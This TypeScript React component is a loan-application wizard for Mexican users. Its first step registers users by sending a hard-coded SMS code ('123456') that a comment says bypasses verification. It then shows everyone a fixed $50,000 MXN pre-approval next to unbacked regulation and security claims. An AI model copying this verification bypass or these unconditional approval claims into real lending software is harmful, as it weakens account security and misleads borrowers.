import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  birthDate?: string;
  // 其他字段...
  idNumber?: string;
  realName?: string;
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  bankCardNumber?: string;
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 第1步：用户注册 - 专业金融风格
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [registrationSuccess, setRegistrationSuccess] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
    { code: '+56', name: 'Chile', flag: '🇨🇱' },
    { code: '+57', name: 'Colombia', flag: '🇨🇴' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone.trim()) return;

    setIsRegistering(true);
    try {
      // 自动注册用户（使用固定验证码绕过短信）
      const result = await httpClient.post('/auth/verify-sms', {
        phone: `${countryCode}${phone}`,
        code: '123456' // 固定验证码
      }) as any;

      if (result.success) {
        setRegistrationSuccess(true);
        onUpdate({ 
          phone: `${countryCode}${phone}`,
          userId: result.userId 
        });
        
        // 显示预批准金额
        setShowApprovedAmount(true);
        
        // 更新申请步骤
        if (updateApplicationStep) {
          await updateApplicationStep(1, { 
            phone: `${countryCode}${phone}`,
            userId: result.userId 
          });
        }
      }
    } catch (error) {
      console.error('Registration error:', error);
    } finally {
      setIsRegistering(false);
    }
  };

  return (
    <div className="dili-card__body">
      {/* 步骤标题 */}
      <div className="dili-mb-lg">
        <div className="flex items-center space-x-3 dili-mb-md">
          <div className="w-12 h-12 bg-slate-800 rounded-full flex items-center justify-center">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
            </svg>
          </div>
          <div>
            <h2 className="dili-text-xl dili-font-bold dili-text-primary-900">Verificación de Teléfono</h2>
            <p className="dili-text-sm dili-text-primary-600">Ingresa tu número para verificar tu elegibilidad</p>
          </div>
        </div>
        
        {/* 安全提示 */}
        <div className="dili-security-badge">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <span>Proceso 100% seguro y encriptado</span>
        </div>
      </div>

      {!showApprovedAmount ? (
        <div className="space-y-6">
          {/* 手机号输入区域 */}
          <div className="dili-form-group">
            <label className="dili-form-label dili-form-label--required">
              Número de teléfono
            </label>
            <div className="dili-grid dili-grid--2" style={{gridTemplateColumns: 'auto 1fr', gap: '12px'}}>
              <select
                value={countryCode}
                onChange={(e) => setCountryCode(e.target.value)}
                className="dili-input"
                style={{minWidth: '140px'}}
              >
                {countryCodes.map((country) => (
                  <option key={country.code} value={country.code}>
                    {country.flag} {country.code}
                  </option>
                ))}
              </select>
              <input
                type="tel"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="dili-input"
                placeholder="Ingresa tu número de teléfono"
              />
            </div>
          </div>

          {/* 注册成功提示 */}
          {registrationSuccess && (
            <div className="dili-status dili-status--success">
              <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              Usuario registrado exitosamente
            </div>
          )}

          {/* 主要按钮 */}
          <button
            onClick={handleCheckEligibility}
            disabled={!phone.trim() || isRegistering}
            className="dili-button dili-button--primary dili-button--large w-full"
          >
            {isRegistering ? (
              <div className="flex items-center justify-center space-x-2">
                <div className="dili-loading"></div>
                <span>Verificando...</span>
              </div>
            ) : (
              'Ver Mi Límite de Crédito'
            )}
          </button>

          {/* 信任指标 */}
          <div className="dili-grid dili-grid--2 pt-6 border-t border-slate-200" style={{gridTemplateColumns: 'repeat(3, 1fr)'}}>
            <div className="text-center">
              <div className="dili-text-2xl dili-font-bold dili-text-primary-900">2min</div>
              <div className="dili-text-xs dili-text-primary-600">Aprobación</div>
            </div>
            <div className="text-center">
              <div className="dili-text-2xl dili-font-bold dili-text-primary-900">0%</div>
              <div className="dili-text-xs dili-text-primary-600">Comisión</div>
            </div>
            <div className="text-center">
              <div className="dili-text-2xl dili-font-bold dili-text-primary-900">24/7</div>
              <div className="dili-text-xs dili-text-primary-600">Soporte</div>
            </div>
          </div>
        </div>
      ) : (
        <div className="space-y-6">
          {/* 预批准金额显示 */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6 text-center">
            <div className="dili-mb-md">
              <svg className="w-16 h-16 text-green-600 mx-auto" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <h3 className="dili-text-2xl dili-font-bold text-green-800 dili-mb-sm">¡Felicidades!</h3>
            <p className="text-green-700 dili-mb-md">Has sido pre-aprobado para un préstamo de hasta:</p>
            <div className="dili-text-3xl dili-font-bold text-green-800 dili-mb-md">$50,000 MXN</div>
            <div className="bg-white rounded-lg p-4 text-left space-y-2">
              <div className="flex justify-between dili-text-sm">
                <span className="dili-text-primary-600">Tasa de interés:</span>
                <span className="dili-font-semibold dili-text-primary-800">Desde 12% anual</span>
              </div>
              <div className="flex justify-between dili-text-sm">
                <span className="dili-text-primary-600">Plazo:</span>
                <span className="dili-font-semibold dili-text-primary-800">6 a 36 meses</span>
              </div>
              <div className="flex justify-between dili-text-sm">
                <span className="dili-text-primary-600">Sin comisiones:</span>
                <span className="dili-font-semibold dili-text-accent-green">✓ Apertura gratuita</span>
              </div>
            </div>
          </div>

          {/* 继续按钮 */}
          <button
            onClick={onNext}
            className="dili-button dili-button--primary dili-button--large w-full"
          >
            Continuar con mi Solicitud
          </button>
        </div>
      )}
    </div>
  );
};

// 第2步：个人信息 - 专业金融风格
const Step2PersonalInfo: React.FC<StepProps> = ({ data, onUpdate, onNext, onBack }) => {
  const { t } = useTranslation();

  return (
    <div className="dili-card__body">
      {/* 步骤标题 */}
      <div className="dili-mb-lg">
        <div className="flex items-center space-x-3 dili-mb-md">
          <div className="w-12 h-12 bg-slate-800 rounded-full flex items-center justify-center">
            <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
            </svg>
          </div>
          <div>
            <h2 className="dili-text-xl dili-font-bold dili-text-primary-900">Información Personal</h2>
            <p className="dili-text-sm dili-text-primary-600">Completa tus datos personales</p>
          </div>
        </div>
        
        {/* 安全提示 */}
        <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 flex items-start space-x-3">
          <svg className="w-5 h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
          </svg>
          <div>
            <p className="dili-text-sm dili-font-medium dili-text-primary-700">Información protegida</p>
            <p className="dili-text-xs dili-text-primary-600">Todos tus datos están encriptados y seguros</p>
          </div>
        </div>
      </div>

      {/* 表单区域 */}
      <div className="space-y-6">
        <div className="dili-grid dili-grid--2">
          <div className="dili-form-group">
            <label className="dili-form-label dili-form-label--required">
              Nombre(s)
            </label>
            <input
              type="text"
              value={data.firstName || ''}
              onChange={(e) => onUpdate({ firstName: e.target.value })}
              className="dili-input"
              placeholder="Ingresa tu nombre"
            />
          </div>

          <div className="dili-form-group">
            <label className="dili-form-label dili-form-label--required">
              Apellidos
            </label>
            <input
              type="text"
              value={data.lastName || ''}
              onChange={(e) => onUpdate({ lastName: e.target.value })}
              className="dili-input"
              placeholder="Ingresa tus apellidos"
            />
          </div>

          <div className="dili-form-group">
            <label className="dili-form-label dili-form-label--required">
              Correo electrónico
            </label>
            <input
              type="email"
              value={data.email || ''}
              onChange={(e) => onUpdate({ email: e.target.value })}
              className="dili-input"
              placeholder="ejemplo@correo.com"
            />
          </div>

          <div className="dili-form-group">
            <label className="dili-form-label dili-form-label--required">
              Fecha de nacimiento
            </label>
            <input
              type="date"
              value={data.birthDate || ''}
              onChange={(e) => onUpdate({ birthDate: e.target.value })}
              className="dili-input"
            />
          </div>
        </div>
      </div>

      {/* 导航按钮 */}
      <div className="flex flex-col sm:flex-row justify-between items-center pt-8 mt-8 border-t border-slate-200 space-y-4 sm:space-y-0">
        <button
          onClick={onBack}
          className="dili-button dili-button--secondary w-full sm:w-auto"
        >
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />
          </svg>
          Anterior
        </button>
        
        <button
          onClick={onNext}
          disabled={!data.firstName || !data.lastName || !data.email || !data.birthDate}
          className="dili-button dili-button--primary w-full sm:w-auto"
        >
          Siguiente
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clipRule="evenodd" />
          </svg>
        </button>
      </div>
    </div>
  );
};

// 主向导组件 - 专业金融风格
const LoanWizardProfessional: React.FC = () => {
  const { t } = useTranslation();
  const [currentStep, setCurrentStep] = useState(1);
  const [applicationData, setApplicationData] = useState<LoanApplication>({
    step: 1,
    isGuest: true
  });
  const totalSteps = 12;

  const updateApplicationData = (data: Partial<LoanApplication>) => {
    setApplicationData(prev => ({ ...prev, ...data }));
  };

  const updateApplicationStep = async (step: number, stepData: any) => {
    try {
      if (applicationData.id) {
        await httpClient.put(`/applications/${applicationData.id}`, {
          step,
          ...stepData
        });
      }
    } catch (error) {
      console.error('Error updating application step:', error);
    }
  };

  const renderStep = () => {
    const stepProps = {
      data: applicationData,
      onUpdate: updateApplicationData,
      onNext: () => setCurrentStep(prev => Math.min(prev + 1, totalSteps)),
      onBack: () => setCurrentStep(prev => Math.max(prev - 1, 1)),
      updateApplicationStep
    };

    switch (currentStep) {
      case 1:
        return <Step1UserRegistration {...stepProps} />;
      case 2:
        return <Step2PersonalInfo {...stepProps} />;
      default:
        return (
          <div className="dili-card__body text-center">
            <h2 className="dili-text-2xl dili-font-bold dili-text-primary-800 dili-mb-md">Paso {currentStep}</h2>
            <p className="dili-text-primary-600 dili-mb-lg">Este paso está en desarrollo.</p>
            <div className="flex flex-col sm:flex-row justify-between space-y-4 sm:space-y-0">
              <button
                onClick={() => setCurrentStep(prev => Math.max(prev - 1, 1))}
                className="dili-button dili-button--secondary"
              >
                Anterior
              </button>
              <button
                onClick={() => setCurrentStep(prev => Math.min(prev + 1, totalSteps))}
                className="dili-button dili-button--primary"
              >
                Siguiente
              </button>
            </div>
          </div>
        );
    }
  };

  return (
    <>
      {/* 引入设计系统样式 */}
      <link rel="stylesheet" href="/src/styles/design-system.css" />
      
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100">
        {/* 进度条 - 固定在顶部 */}
        <div className="bg-white border-b border-slate-200 shadow-sm">
          <div className="dili-container py-4 lg:py-6">
            <div className="flex items-center justify-between dili-mb-sm">
              <div className="flex items-center space-x-3">
                <h2 className="dili-text-lg lg:dili-text-xl dili-font-bold dili-text-primary-800">
                  Solicitud de Préstamo
                </h2>
                <div className="dili-hidden-mobile flex items-center space-x-2 dili-text-sm dili-text-primary-600">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span>Proceso seguro y encriptado</span>
                </div>
              </div>
              <div className="text-right">
                <div className="dili-text-sm dili-font-semibold dili-text-primary-800">
                  Paso {currentStep} de {totalSteps}
                </div>
                <div className="dili-text-xs dili-text-primary-500">
                  {Math.round((currentStep / totalSteps) * 100)}% completado
                </div>
              </div>
            </div>
            
            {/* 进度条 */}
            <div className="dili-progress">
              <div
                className="dili-progress__bar"
                style={{ width: `${(currentStep / totalSteps) * 100}%` }}
              ></div>
            </div>
          </div>
        </div>

        {/* 主内容区域 */}
        <div className="w-full">
          <div className="dili-container py-6 lg:py-8">
            <div className="flex flex-col lg:flex-row lg:space-x-8">
              {/* 左侧：步骤内容 */}
              <div className="flex-1 lg:max-w-3xl">
                <div className="dili-card dili-card--elevated">
                  {renderStep()}
                </div>
              </div>

              {/* 右侧：信息面板 (桌面端显示) */}
              <div className="dili-hidden-mobile lg:w-80 xl:w-96">
                <div className="sticky top-24 space-y-6">
                  {/* 安全保障 */}
                  <div className="dili-card dili-card--elevated">
                    <div className="dili-card__body">
                      <h3 className="dili-font-bold dili-text-primary-800 dili-text-lg dili-mb-md">
                        Garantías de Seguridad
                      </h3>
                      <div className="space-y-4">
                        <div className="flex items-start space-x-3">
                          <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                            </svg>
                          </div>
                          <div>
                            <h4 className="dili-font-semibold dili-text-primary-800 dili-text-sm">Encriptación SSL</h4>
                            <p className="dili-text-primary-600 dili-text-xs">Datos protegidos con tecnología bancaria</p>
                          </div>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                            </svg>
                          </div>
                          <div>
                            <h4 className="dili-font-semibold dili-text-primary-800 dili-text-sm">Regulado CNBV</h4>
                            <p className="dili-text-primary-600 dili-text-xs">Autorizado por autoridades financieras</p>
                          </div>
                        </div>
                        <div className="flex items-start space-x-3">
                          <div className="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0">
                            <svg className="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20">
                              <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <div>
                            <h4 className="dili-font-semibold dili-text-primary-800 dili-text-sm">Proceso Transparente</h4>
                            <p className="dili-text-primary-600 dili-text-xs">Sin costos ocultos ni sorpresas</p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* 优势 */}
                  <div className="dili-card dili-card--elevated">
                    <div className="dili-card__body">
                      <h3 className="dili-font-bold dili-text-primary-800 dili-text-lg dili-mb-md">
                        ¿Por qué elegirnos?
                      </h3>
                      <div className="space-y-3">
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                          <span className="dili-text-primary-700 dili-text-sm">Aprobación en minutos</span>
                        </div>
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                          <span className="dili-text-primary-700 dili-text-sm">Tasas competitivas</span>
                        </div>
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                          <span className="dili-text-primary-700 dili-text-sm">Sin penalizaciones</span>
                        </div>
                        <div className="flex items-center space-x-2">
                          <div className="w-2 h-2 bg-slate-800 rounded-full"></div>
                          <span className="dili-text-primary-700 dili-text-sm">Soporte 24/7</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* 联系支持 */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-6">
                    <h3 className="dili-font-semibold dili-text-primary-800 dili-text-base dili-mb-sm">
                      ¿Necesitas ayuda?
                    </h3>
                    <p className="dili-text-primary-600 dili-text-sm dili-mb-md">
                      Nuestro equipo está disponible para asistirte durante todo el proceso.
                    </p>
                    <div className="space-y-2 dili-text-sm">
                      <div className="flex items-center space-x-2 dili-text-primary-700">
                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                          <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                          <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                        </svg>
                        <span>diliads01@outlook.com</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* 底部信任条 */}
        <div className="bg-slate-800 text-white py-4">
          <div className="dili-container">
            <div className="flex flex-col lg:flex-row items-center justify-between space-y-4 lg:space-y-0">
              <div className="flex items-center space-x-6 dili-text-sm">
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                  </svg>
                  <span className="text-slate-300">SSL Seguro</span>
                </div>
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                  <span className="text-slate-300">CNBV Regulado</span>
                </div>
                <div className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span className="text-slate-300">Datos Protegidos</span>
                </div>
              </div>
              <div className="dili-text-sm text-slate-400">
                © 2024 DiliInfo Financial Services. Todos los derechos reservados.
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default LoanWizardProfessional;